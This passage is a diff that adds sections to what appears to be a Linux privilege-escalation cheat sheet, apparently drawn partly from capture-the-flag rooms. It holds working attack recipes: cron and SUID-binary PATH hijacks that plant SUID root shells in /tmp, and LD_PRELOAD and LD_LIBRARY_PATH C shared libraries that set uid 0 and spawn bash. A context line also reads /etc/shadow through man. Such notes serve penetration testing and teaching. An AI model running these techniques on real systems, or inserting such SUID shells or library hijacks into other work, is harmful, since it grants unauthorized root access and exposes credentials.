@@ -12,6 +12,46 @@ chmod +xs /tmp/bash
 /tmp/bash
 ```
 
+# CronJobs
+##### CronJobs - PATH Environment Variable
+```bash
+cat /etc/crontab
+# IF CronJobs includes a <file>.sh script and PATH includes user directory at start of path.
+
+# Create <file>.sh in directory specified int he PATH.
+#!/bin/bash
+cp /bin/bash /tmp/rootbash
+chmod +xs /tmp/rootbash
+
+# Make sure that the file is executable:
+chmod +x <file>.sh
+
+# Run rootbash to gain root access.
+/tmp/rootbash -p
+```
+
+# PATH Environment Variable
+##### Alternate PATH Environment Variable - THM from Kenobi
+```bash
+find / -perm -u=s -type f -exec ls -l {} \; 2> /dev/null
+-rwsr-xr-x 1 root root 8880 Sep  4  2019 /usr/bin/menu # Calls other commands
+/usr/bin/menu
+# /usr/bin/menu appears to be a user defined menu, to call other commands.
+# strings /usr/bin/menu to see if it calls commands with full paths.
+strings /usr/bin/menu
+# Returns:
+curl -I localhost
+uname -r
+ifconfig
+# /usr/bin/menu does not use full paths and executes as root.
+# Copy a shell to /tmp/ replacing the name of one of the above commands.
+# The menu will execute as root, launching a root shell.
+cp /bin/bash /tmp/ifconfig
+chmod +x /tmp/ifconfig # set permission
+export PATH=/tmp:$PATH # set path so that /usr/bin/menu runs command from /tmp and not actual location
+/usr/bin/menu
+```
+
 # SUID Binaries
 ##### Known SUID Binaries
 ```bash
@@ -44,6 +84,53 @@ man -P "cat /etc/shadow" man
 ```
 ##### Docker
 [dockerevil](https://github.com/pyperanger/dockerevil)
+
+##### Sudo - Environment Variables - LD_PRELOAD
+```c
+/* File: preload.c */
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+        unsetenv("LD_PRELOAD");
+        setresuid(0,0,0);
+        system("/bin/bash -p");
+}
+```
+[preload.c](Files/preload.c)
+```bash
+# Compile C code and save as payload to run before desires sudo -l program.
+gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
+sudo -l
+sudo LD_PRELOAD=/tmp/preload.so <sudo -l program-name-here>
+```
+
+##### Sudo - Environment Variables - LD_LIBRARY_PATH
+```c
+/* File: */
+#include <stdio.h>
+#include <stdlib.h>
+
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+        unsetenv("LD_LIBRARY_PATH");
+        setresuid(0,0,0);
+        system("/bin/bash -p");
+}
+```
+[envvar.c](Files/envvar.c)
+```bash
+sudo -l
+# Get list of libraries used by desired program
+# ldd <sudo -l program>
+ldd /usr/sbin/apache2
+# Compile C code and save to /tmp under name of the expected library.
+gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
+# Set library path to where our hyjack code exists and call the sudo -l program.
+sudo LD_LIBRARY_PATH=/tmp apache2
+```
 
 # Restricted Shells
 ##### Escape with Vi/Vim
